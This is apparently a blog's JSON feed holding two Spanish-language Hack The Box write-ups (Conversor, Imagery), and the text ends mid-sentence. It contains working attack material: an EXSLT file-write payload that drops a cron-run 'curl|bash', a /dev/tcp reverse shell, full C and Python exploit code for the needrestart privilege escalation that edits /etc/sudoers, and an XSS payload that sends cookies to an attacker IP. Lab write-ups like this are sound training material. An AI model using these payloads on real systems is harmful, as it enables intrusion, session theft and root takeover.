[
  
  {
    "title": "Conversor - Hack The Box",
    "url": "/posts/conversor/",
    "categories": "htb, linux",
    "tags": "Linux",
    "date": "2025-10-29 00:00:00 +0000",
    





    
    "snippet": "La maquina conversor de Hack The Box es de dificultad Facil, primero nos encontramos con una aplicacion web alojada en el puerto 80 donde atravez de metodos de FUZZEO captamos un comprimido source_...",
    "content": "La maquina conversor de Hack The Box es de dificultad Facil, primero nos encontramos con una aplicacion web alojada en el puerto 80 donde atravez de metodos de FUZZEO captamos un comprimido source_code.tar.gz en ella nos encontramos con el codigo fuente de la web, esta app llamada conversor funciona subiendo un archivo xml y por otro lado un xslt obteniendo como resultado un enlace donde te da un estilo final a la informacion que contiene tu xml. Esta app es vulnerable a EXSLT fue asi como logramos la intrusion a la maquina. En este punto estando como el usuario www-data capturamos un hash MD5 del usuario fismathack y asi pivoteando a otro privilegio, luego enumerando por los permisos SUDOERS como el usuario fismathack observamos que el usuario puede ejecutar el binario needstart en su version 3.7 vulnerable a Local Privilege Escalation y de esa manera conseguimos el root.ReconocimientoNmapPrimero vamos a empezar con un escaneo rapido y preciso para dar con los puertos abiertosnmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.123.234Completed SYN Stealth Scan at 13:21, 35.05s elapsed (65535 total ports)Nmap scan report for 10.129.123.234Host is up, received user-set (6.6s latency).Scanned at 2025-10-29 13:21:08 CET for 35sNot shown: 54025 filtered tcp ports (no-response), 11508 closed tcp ports (reset)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 63Read data files from: /usr/share/nmapNmap done: 1 IP address (1 host up) scanned in 35.13 seconds           Raw packets sent: 130476 (5.741MB) | Rcvd: 46357 (1.854MB)PORT -&gt; 22 SSHPORT -&gt; 80 HTTP Nmap Servicios y Puertosnmap -p22,80 -sCV 10.129.123.234Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 13:36 CETNmap scan report for 10.129.123.234Host is up (0.29s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)80/tcp open  http    Apache httpd 2.4.52|_http-title: Did not follow redirect to http://conversor.htb/|_http-server-header: Apache/2.4.52 (Ubuntu)Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 44.21 secondsCuando realizamos el escaneo de los servicios que corren en los puertos, nos encontramos con el dominio de la maquina victima. Vamos a escribirlo en el /etc/hosts para que la IP nos resuelva la web.echo \"10.129.123.234 conversor.htb\" &gt;&gt; /etc/hostsWebcurl -I http://conversor.htbHTTP/1.1 302 FOUNDDate: Wed, 29 Oct 2025 12:45:41 GMTServer: Apache/2.4.52 (Ubuntu)Content-Length: 199Location: /loginContent-Type: text/html; charset=utf-8Si realizamos un curl a la web para extraer un poco mas de info, nos encontramos con un apache 2.4. Tambien observamos un panel de registro y login.Vamos a registrarnos y ver que esconde esta aplicacion web.Muy bien, al parecer trata de una web que convierte un archivo XML a algo mas estetico… se refiere a algun reporte que se puede sacar con nmap. Se me ocurren muchos vectores de ataque para esta web, una de ellas seria un XXE (External Entity Injection) o tambien si no valida las extensiones se puede subir un SVG y derivarlo a un SSRF…  En otras palabras se pueden probar muchas cosas en esta aplicacion. Pero vamos por partesecho \"eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6Im1yaW5jcmVpYmxlIn0.aQINpQ.QDBv9-vaxTbncb9y6Ak4EPT0MKI\" | base64 -d | jq{  \"user_id\": 5,  \"username\": \"mrincreible\"}En mi token vemos esa informacionEnumeracion Web Fuzzwfuzz -c --hc=404 --hh=2767 -t 100 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://conversor.htb/FUZZ' -H 'Cookie: session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6Im1yaW5jcmVpYmxlIn0.aQINpQ.QDBv9-vaxTbncb9y6Ak4EPT0MKI' /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://conversor.htb/FUZZTotal requests: 4746=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                    =====================================================================000000466:   200        80 L     214 W      2838 Ch     \"about\"                                                                                                    000002334:   301        9 L      28 W       319 Ch      \"javascript\"                                                                                               000002529:   200        21 L     50 W       722 Ch      \"login\"                                                                                                    000002544:   302        5 L      22 W       199 Ch      \"logout\"                                                                                                   000003498:   200        20 L     50 W       726 Ch      \"register\"                                                                                                 000003736:   403        9 L      28 W       278 Ch      \"server-status\"                                                                                            Total time: 0Processed Requests: 4746Filtered Requests: 4740Requests/sec.: 0Sin exito, solo conseguimos esto… vamos a profundizar con otra herramienta como Feroxbusterferoxbuster --url http://conversor.htb --cookies 'session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6Im1yaW5jcmVpYmxlIn0.aQINpQ.QDBv9-vaxTbncb9y6Ak4EPT0MKI'                                                                                                                                                                             ___  ___  __   __     __      __         __   ___|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___by Ben \"epi\" Risher 🤓                 ver: 2.11.0───────────────────────────┬────────────────────── 🎯  Target Url            │ http://conversor.htb 🚀  Threads               │ 50 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 👌  Status Codes          │ All Status Codes! 💥  Timeout (secs)        │ 7 🦡  User-Agent            │ feroxbuster/2.11.0 💉  Config File           │ /etc/feroxbuster/ferox-config.toml 🤯  Header                │ Cookie: session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6Im1yaW5jcmVpYmxlIn0.aQINpQ.QDBv9-vaxTbncb9y6Ak4EPT0MKI 🔎  Extract Links         │ true 🏁  HTTP methods          │ [GET] 🔃  Recursion Depth       │ 4───────────────────────────┴────────────────────── 🏁  Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter302      GET        5l       22w      199c http://conversor.htb/logout =&gt; http://conversor.htb/login200      GET      107l      197w     3216c http://conversor.htb/static/nmap.xslt405      GET        5l       20w      153c http://conversor.htb/convert200      GET      290l      652w     5938c http://conversor.htb/static/style.css200      GET       81l      214w     2842c http://conversor.htb/about200      GET       79l      214w     2768c http://conversor.htb/200      GET       22l       50w      722c http://conversor.htb/login200      GET       21l       50w      726c http://conversor.htb/register301      GET        9l       28w      319c http://conversor.htb/javascript =&gt; http://conversor.htb/javascript/403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter200      GET      362l     2080w   178136c http://conversor.htb/static/images/fismathack.png200      GET        0l        0w  1688968c http://conversor.htb/static/images/arturo.png200      GET        0l        0w  4085760c http://conversor.htb/static/source_code.tar.gz200      GET        0l        0w  2229125c http://conversor.htb/static/images/david.png301      GET        9l       28w      326c http://conversor.htb/javascript/jquery =&gt; http://conversor.htb/javascript/jquery/200      GET        0l        0w   288550c http://conversor.htb/javascript/jquery/jqueryEn este escaneo con Feroxbuster tenemos que pasarle nuestro token con el parametro –cookies. Encontramos algo jugoso expuesto… source_code.tar.gzVamos a traerlo a nuestra maquina y descomprimirlo, haber si podemos aprovecharnos de alguna vulnerabilidad.Source Code (Analisis de Codigo Fuente)sudo tar -xvf source_code.tar.gzapp.pyapp.wsgiinstall.mdinstance/instance/users.dbscripts/static/static/images/static/images/david.pngstatic/images/fismathack.pngstatic/images/arturo.pngstatic/nmap.xsltstatic/style.csstemplates/templates/register.htmltemplates/about.htmltemplates/index.htmltemplates/login.htmltemplates/base.htmltemplates/result.htmluploads/To deploy Conversor, we can extract the compressed file:\"\"\"tar -xvf source_code.tar.gz\"\"\"We install flask:\"\"\"pip3 install flask\"\"\"We can run the app.py file:\"\"\"python3 app.py\"\"\"You can also run it with Apache using the app.wsgi file.If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.\"\"\"* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 \"$f\"; done\"\"\"Antes de empezar con el analisis de codigo, vamos a probar la funcion de como convierte los archivos xml y xslt.Excelente!!!… Convierte los escaneos en un formato agradable a la vista y se ve muy bien. PEROAnalizando su contenido, nos encontramos con un archivo install.md que al parecer contiene una tarea cron que ejecuta cada minuto esto * * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 \"$f\"; done, ejecuta todos los scripts que se encuentren en esa carpeta.app.py@app.route('/convert', methods=['POST'])def convert():    if 'user_id' not in session:        return redirect(url_for('login'))    xml_file = request.files['xml_file']    xslt_file = request.files['xslt_file']    from lxml import etree    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)    xml_file.save(xml_path)    xslt_file.save(xslt_path)    try:        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)        xml_tree = etree.parse(xml_path, parser)        xslt_tree = etree.parse(xslt_path)        transform = etree.XSLT(xslt_tree)        result_tree = transform(xml_tree)        result_html = str(result_tree)        file_id = str(uuid.uuid4())        filename = f\"{file_id}.html\"        html_path = os.path.join(UPLOAD_FOLDER, filename)        with open(html_path, \"w\") as f:            f.write(result_html)        conn = get_db()        conn.execute(\"INSERT INTO files (id,user_id,filename) VALUES (?,?,?)\", (file_id, session['user_id'], filename))        conn.commit()        conn.close()        return redirect(url_for('index'))    except Exception as e:        return f\"Error: {e}\"Este es el codigo de app.py, en el destacamos la funcion convert por lo siguiente:  Comprueba y analiza el XSLT proporcionado por el usuario  Luego utiliza ese XSLT para transformar el XML&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;  &lt;xsl:output method=\"html\" indent=\"yes\" /&gt;  &lt;xsl:template match=\"/\"&gt;    &lt;html&gt;      &lt;head&gt;        &lt;title&gt;Nmap Scan Results&lt;/title&gt;        &lt;style&gt;          body {            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;            background: linear-gradient(120deg, #141E30, #243B55);            color: #eee;            margin: 0;            padding: 0;          }          h1, h2, h3 {            text-align: center;            font-weight: 300;          }          .card {            background: rgba(255, 255, 255, 0.05);            margin: 30px auto;            padding: 20px;            border-radius: 12px;            box-shadow: 0 4px 20px rgba(0,0,0,0.5);            width: 80%;          }          table {            width: 100%;            border-collapse: collapse;            margin-top: 15px;          }          th, td {            padding: 10px;            text-align: center;          }          th {            background: rgba(255,255,255,0.1);            color: #ffcc70;            font-weight: 600;            border-bottom: 2px solid rgba(255,255,255,0.2);          }          tr:nth-child(even) {            background: rgba(255,255,255,0.03);          }          tr:hover {            background: rgba(255,255,255,0.1);          }          .open {            color: #00ff99;            font-weight: bold;          }          .closed {            color: #ff5555;            font-weight: bold;          }          .host-header {            font-size: 20px;            margin-bottom: 10px;            color: #ffd369;          }          .ip {            font-weight: bold;            color: #00d4ff;          }        &lt;/style&gt;      &lt;/head&gt;      &lt;body&gt;        &lt;h1&gt;Nmap Scan Report&lt;/h1&gt;        &lt;h3&gt;&lt;xsl:value-of select=\"nmaprun/@args\"/&gt;&lt;/h3&gt;        &lt;xsl:for-each select=\"nmaprun/host\"&gt;          &lt;div class=\"card\"&gt;            &lt;div class=\"host-header\"&gt;              Host: &lt;span class=\"ip\"&gt;&lt;xsl:value-of select=\"address[@addrtype='ipv4']/@addr\"/&gt;&lt;/span&gt;              &lt;xsl:if test=\"hostnames/hostname/@name\"&gt;                (&lt;xsl:value-of select=\"hostnames/hostname/@name\"/&gt;)              &lt;/xsl:if&gt;            &lt;/div&gt;            &lt;table&gt;              &lt;tr&gt;                &lt;th&gt;Port&lt;/th&gt;                &lt;th&gt;Protocol&lt;/th&gt;                &lt;th&gt;Service&lt;/th&gt;                &lt;th&gt;State&lt;/th&gt;              &lt;/tr&gt;              &lt;xsl:for-each select=\"ports/port\"&gt;                &lt;tr&gt;                  &lt;td&gt;&lt;xsl:value-of select=\"@portid\"/&gt;&lt;/td&gt;                  &lt;td&gt;&lt;xsl:value-of select=\"@protocol\"/&gt;&lt;/td&gt;                  &lt;td&gt;&lt;xsl:value-of select=\"service/@name\"/&gt;&lt;/td&gt;                  &lt;td&gt;                    &lt;xsl:attribute name=\"class\"&gt;                      &lt;xsl:value-of select=\"state/@state\"/&gt;                    &lt;/xsl:attribute&gt;                    &lt;xsl:value-of select=\"state/@state\"/&gt;                  &lt;/td&gt;                &lt;/tr&gt;              &lt;/xsl:for-each&gt;            &lt;/table&gt;          &lt;/div&gt;        &lt;/xsl:for-each&gt;      &lt;/body&gt;    &lt;/html&gt;  &lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;Este XSLT que nos proporciona la web es el estilo que nos da cuando le pasamos un archivo XML, buscando por Payload All The ThingsNos encontramos con un apartado que se llama Write Files with EXSLT ExtensionXSLT - EXSLT (Write File)Es un conjunto de extensiones del lenguaje XSLT (Transformaciones Extensibles de Lenguaje de Hojas de Estilo).  XSLT -&gt; Es un lenguaje de programación (sorprendentemente complejo) escrito en XML, diseñado para transformar un documento XML a otro formato (como HTML).  ¿Qué es libxml2? Es la biblioteca C subyacente que utiliza el módulo lxml de Python (y muchos otros analizadores) para manejar XML y XSLT.  ¿Qué es EXSLT? Se trata de un conjunto de extensiones de XSLT para dotarlo de mayor potencia (como funciones de fecha y hora, manipulación de cadenas, etc.).  Vulnerabilidad: libxml2 admite un espacio de nombres XSLT peligroso: http://exslt.org/common. Este espacio de nombres incluye la función &lt;shell:document&gt;. Esta función permitía que la transformación XSLT generara su resultado en varios archivos.  PoC: El atributo href de &lt;shell:document&gt; es vulnerable. Puede aceptar una ruta de archivo absoluta. El procesador XSLT (ejecuta como www-data) escribira sin problemas el contenido de la etiqueta shell:document en cualquier archivo del sistema que tenga permisos de escritura.Sabiendo todo esto buscar un metodo de intrusion es sencilla, vamos a crear un archivo xml con nmap y tambien vamos a sacar el exploit que se encuentra en Payload All The Thingsnmap -sC -oX nmap.xml 10.129.123.234&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;xsl:stylesheet  xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"  xmlns:shell=\"http://exslt.org/common\"   extension-element-prefixes=\"shell\"  version=\"1.0\"&gt;  &lt;xsl:template match=\"/\"&gt;    &lt;shell:document href=\"/var/www/conversor.htb/scripts/shell.py\" method=\"text\"&gt;import osos.system(\"curl 10.10.16.16|bash\")          &lt;/shell:document&gt;  &lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;Este XSLT va a escribir un archivo .py en la carpeta /var/www/conversor.htb/scripts/, existe una tarea cron antes mencionada que se ejecuta cada 1 minuto.Esta tarea se va a ejecutar y me dara acceso al sistema#!/bin/bashbash -i &gt;&amp; /dev/tcp/10.10.16.16/443 0&gt;&amp;1Crearemos este pequeño script y guardarlo como index.html en nuestro sistema y en la misma carpeta donde tenemos este script vamos levantar un servidor con pythonpython3 -m http.server 80Tambien vamos a estar escuchando con netcat por el puerto 443nc -nlvp 443ESTO ES GENIAL!!!!! Ya conseguimos una shell y estamos ejecutando comandos dentro del sistema!!!… Esta vulnerabilidad esta MUY BUENA!!!Escalada de PrivilegiosShell como www-dataComo primer punto inicial, vamos a enumerar por a nivel de RED donde nos ubicamoswww-data@conversor:~$ hostname -I10.129.123.234 www-data@conversor:~$ ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 10.129.123.234  netmask 255.255.0.0  broadcast 10.129.255.255        ether 00:50:56:b0:23:8f  txqueuelen 1000  (Ethernet)        RX packets 206732  bytes 21548291 (21.5 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 173074  bytes 27972619 (27.9 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 30398  bytes 2161114 (2.1 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 30398  bytes 2161114 (2.1 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0www-data@conversor:~$Podemos decir que en un contenedor de docker no estamoswww-data@conversor:~$ netstat -tnlp(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   tcp6       0      0 :::22Tampoco encontramos puertos internos abiertosOtra manera de enumerar mas a fondo y escalar privilegios es probar el LinPEAS pero en este caso vamos a terminar las vias que tenemos nosotros a la hora de enumerar.www-data@conversor:~$ cat /etc/crontab# /etc/crontab: system-wide crontab# Unlike any other crontab you don't have to run the `crontab'# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/sh# You can also override PATH, but by default, newer versions inherit it from the environment#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name command to be executed17 *\t* * *\troot    cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )#* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 \"$f\"; doneEsta tarea programada nos dio acceso al servidor, este es un error de los desarrolladores y propio de un SYSADMIN. Al dejar expuesto un endpoint donde me da acceso a descargar el codigo fuente de la app.En el source_code.tar.gz que descargue, en la carpeta instance habia un users.db, pero su contenido era totalmente escaso de usuarios. Sin embargo una vez dentro del sistema encontramos esto.www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db SQLite version 3.37.2 2022-01-06 13:25:41Enter \".help\" for usage hints.sqlite&gt; .tablesfiles  userssqlite&gt; select * from users;1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec5|mrincreible|a9a6b0fd059846acf67ac475b98f0474sqlite&gt; .schema usersCREATE TABLE users (        id INTEGER PRIMARY KEY AUTOINCREMENT,        username TEXT UNIQUE,        password TEXT    );sqlite&gt;1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec5|mrincreible|a9a6b0fd059846acf67ac475b98f0474Shell como fismathackAl parecer parecen hashes en MD5, vamos a pasarselo a crackstationY sin ninguna duda se logra romper el hash, obtuvimos la contraseña del usuario fismathackfismathack@conversor:~$ iduid=1000(fismathack) gid=1000(fismathack) groups=1000(fismathack)fismathack@conversor:~$ whoamifismathackfismathack@conversor:~$ sudo -lMatching Defaults entries for fismathack on conversor:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser fismathack may run the following commands on conversor:    (ALL : ALL) NOPASSWD: /usr/sbin/needrestartEsto es excelente, conseguimos escalar privilegios a un usuario valido a nivel de sistema. Y tambien vemos que tiene permisos para ejecutar como ROOT el binario /usr/sbin/needrestartSUDOfismathack@conversor:~$ /usr/sbin/needrestart -v[main] eval /etc/needrestart/needrestart.conf[main] needrestart v3.7[main] running in user mode[Core] Using UI 'NeedRestart::UI::stdio'...[main] systemd detected[main] vm detected[main] inside container or vm, skipping microcode checksVemos la version v3.7 de needrestart.. indagando un poco por google nos encontramos que esa version es vulnerablo a un Local Privilege Escalation… que coincidencia es justo lo que necesitamos. JAJAJAMe encontre con este PoC que lo explica bien y desglosa no tan a bajo nivel pero se entiende bien por donde va la explotacion.CVE-2024-48990PoC -&gt; CVE-needrestartVoy a tratar de explicar lo mejor posible el funcionamiento de este PoC ya que nadie lo hace o quizas por mi escaso ingles lo entendi leyendo muchas veces.Compilacion de Lib.cPrimero construi este lib.c para despues compilarlo#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;static void a() __attribute__((constructor));void a() {\tif(getuid() == 0) {\t\tsetuid(0);\t\tsetgid(0);\t\tconst char *shell = \"cp /bin/bash /tmp/poc; \"\t\t\t\t    \"chmod u+s /tmp/poc; \"\t\t\t\t    \"grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || \"\t\t\t\t    \"echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers &gt; /dev/null &amp;\";\t\tsystem(shell);\t}}gcc -shared -fPIC -o __init__.so lib.cSe me creo la compilacion final llamado __init__.so. Pero no termina acaLuego saque esta parte de python del PoCimport timewhile True:    try:        import importlib    except:        pass    if __import__(\"os\").path.exists(\"/tmp/poc\"):        print(\"Got shell!, delete traces in /tmp/poc, /tmp/malicious\")        __import__(\"os\").system(\"sudo /tmp/poc -p\")        break    time.sleep(1)Y lo guarde como e.pyAhora me falta crear un script que automatize la transferencia de estos 2 archivos hacia la maquina victima.Script Bash Automatizacion#!/bin/bashset -ecd /tmpmkdir -p malicious/importlibcurl http://10.10.16.8/__init__.so -o /tmp/malicious/importlib/__init__.socurl http://10.10.16.8/e.py -o /tmp/malicious/e.pycd /tmp/malicious; PYTHONPATH=\"$PWD\" python3 e.py 2&gt;/dev/nullEste script se va a ubicar en la carpeta /tmp y va a crear la carpeta malicious/importlib, luego va a descargar los archivos y lo guardara en diferentes carpetas.Y por ultimo va a ejecutar con una variable de entorno (PYTHONPATH=\"$PWD\") el e.py 2&gt;/dev/null, el bucle que ejecuta el script e.py se va a parar cuando ejecutemos desde otra terminal sudo /usr/sbin/needrestart escalando privilegios como root y viendo la ultima flag."
  },
  
  {
    "title": "Imagery - Hack The Box",
    "url": "/posts/imagery/",
    "categories": "htb, linux",
    "tags": "Linux, Web",
    "date": "2025-10-24 00:00:00 +0000",
    





    
    "snippet": "Imagery es una maquina de dificultad Media que al principio del escaneo nos encontramos con una web desarrollada en el lenguaje python werkzeug. Al principio parece una web normal y simple de subid...",
    "content": "Imagery es una maquina de dificultad Media que al principio del escaneo nos encontramos con una web desarrollada en el lenguaje python werkzeug. Al principio parece una web normal y simple de subida de archivos (imagenes) pero luego nos encontramos con un apartado donde se podian subir reportes de bugs, en esta seccion cargamos un payload en XSS que lo derivamos a un Blind XSS to Admin Account, dentro del panel del usuario Admin nos encontramos con un boton que nos permitia descargar un archivo que contenia logs, aprovechamos a interceptar y ver el endpoint con Burp y asi descubriendo un LFI. Enumerando archivos internos de la maquina observamos un db.json que en su contenido se ubicaban los hashes md5 del usuario testuser y admin, logramos crackear el hash de testuser y nos logueamos como dicho usuario, dentro de este panel nos encontramos con mas funciones que nos permitieron ejecutar comandos en el sistema mediante un Command Injection en uno de los parametros de la funcion Transform Image. Una vez conseguida la shell enumerando obtuvimos un archivo con extension zip.aes que logramos descifrar con PyAesCrypt, en su contenido ubicamos otro db.json con hashes de los usuarios mark y web, tambien logramos crackear el hash de mark y pasando del usuario web a mark. Una vez conseguida la shell como mark este podia ejecutar como SUDO una herramienta llamada charcol, investigamos como ejecutar comandos con esta herramienta y logramos escalar al usuario ROOT.ReconocimientoNmapEmpezamos la maquina con un escaneo basico con nmap pasandole el -p- para escanear todo el rango de puertos, --open este parametro nos va mostrar solo los puertos abiertos, -n -Pn sin resolucion DNS y descubrimiento de HOSTS, -vvv para que nos muestre por consola los puertos que se encuentran abiertos mientras realiza el escaneonmap -p- --open -T4 -vvv -n -Pn 10.10.11.88Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 14:24 CESTInitiating SYN Stealth Scan at 14:24Scanning 10.10.11.88 [65535 ports]Discovered open port 22/tcp on 10.10.11.88SYN Stealth Scan Timing: About 39.33% done; ETC: 14:26 (0:00:48 remaining)Discovered open port 8000/tcp on 10.10.11.88Completed SYN Stealth Scan at 14:27, 126.07s elapsed (65535 total ports)Nmap scan report for 10.10.11.88Host is up, received user-set (0.18s latency).Scanned at 2025-10-24 14:24:58 CEST for 126sNot shown: 65533 closed tcp ports (reset)PORT     STATE SERVICE  REASON22/tcp   open  ssh      syn-ack ttl 638000/tcp open  http-alt syn-ack ttl 63Read data files from: /usr/share/nmapNmap done: 1 IP address (1 host up) scanned in 126.15 seconds           Raw packets sent: 105226 (4.630MB) | Rcvd: 102796 (4.112MB)  Puerto 22          SSH        Puerto 8000          HTTP      Nmap Servicios de PuertosUna vez detectado los puertos abiertos, iniciamos con la deteccion de los servicios que corren en el puerto 22 y 8000nmap -p22,8000 -sCV 10.10.11.88Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 15:20 CESTNmap scan report for 10.10.11.88Host is up (0.27s latency).PORT   STATE  SERVICE VERSION22/tcp open   ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)8000/tcp open httpService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.21 secondsNo hay muchos puertos abiertos, solo existe una web que corre por el puerto 8000WebA simple vista parece una aplicacion web sobre imagenes, ya nos podemos imaginar lo que significa (Arbitrary File Upload) alguna vulnerabilidad sobre subida de archivos…. tambien logramos ver un boton de login y registerPrimero nos vamos a registrar con el usuario mrincreible@imagery.htb y la contraseña mrincreibleAntes de iniciar sesion quiero mostrarles de que manera pueden ver un poco mas sobre la web con curlcurl http://10.10.11.88:8000 -IHTTP/1.1 200 OKServer: Werkzeug/3.1.3 Python/3.12.7Date: Fri, 24 Oct 2025 20:26:33 GMTContent-Type: text/html; charset=utf-8Content-Length: 146960Connection: closeYa que con wappalayzer a veces no muestra nada, podemos hacerlo con curl pasandole el parametro -IEnumeracion Web FuzzPasamos a esta seccion de fuzzear la web para encontrar mas funcionalidades de la app y aprovecharlas/images/login/register/logoutSolo encontramos esto, pero en la web tenemos un boton /upload. Es raro, quizas la funcionalidad de este boton este del lado de cliente o en el template como un JSTenemos un TokenNo es valido como un JWTUpload FilesEn esta parte vamos a realizar un testeo a la subida de archivos, subiremos imagenes sin cargas de XXE,XSS,SSRF o SQLi ya que en este tipo de vulnerabilidades se pueden subir archivos con estas cargasApreciamos la subida de una imagen con extension .png, quiero resaltar lo que pusimos en el campo title y description a la hora de subir la imagenVemos un campo que se refleja en el output de la subida, se ve el campo title y description test.Podemos descargar la imagen y tambien borrarla.http://10.10.11.88:8000/uploads/77e0649c-520b-4b1c-bacb-40388e85c34e_bmw.jpgEn la anterior imagen observamos un apartado de group Add New Group Save Group pero no podemos modificar este como el usuario mrincreiblePrimero estamos entendiendo de que manera funciona la aplicacion web para buscar vias de explotacion. Una de ellas se observa a la hora de reflejar el campo title y description, vamos a intentar inyectar una carga XSS en estos campos.test\"&gt;&lt;script&gt;alert(0)&lt;/script&gt;Al parecer el codigo harcodea y sanitiza bien las entradas en esos campos.Observando bien a fondo la web nos encontramos con una seccion llamada Report BugEn estos campos de Bug Name y Bug Details voy a poner una carga XSS, siempre pongo en todos los campos para estar seguro del ataque ya que no sabemos cual de los campos es el vulnerable.&lt;img src=\"http://10.10.16.8/poc.jpg\"&gt;mientras nos ponemos en escucha con netcat por el puerto 80, ya que la imagen la va a cargar de mi HOST como poc.jpgnc -nlvp 80Funciona!!!. Esto ya seria un Blind XSS (XSS a Ciegas), quiero creer que el reporte lo abre algun administrador, vamos a preparar una carga XSS para secuestrar la sesion del admin.Blind XSS to Admin Account&lt;img src=x onerror=fetch('http://10.10.16.8/?c='+document.cookie);&gt;Como observamos en la imagen tuvimos errores en nc y optamos por ponernos en escucha por el puerto 80 con python teniendo 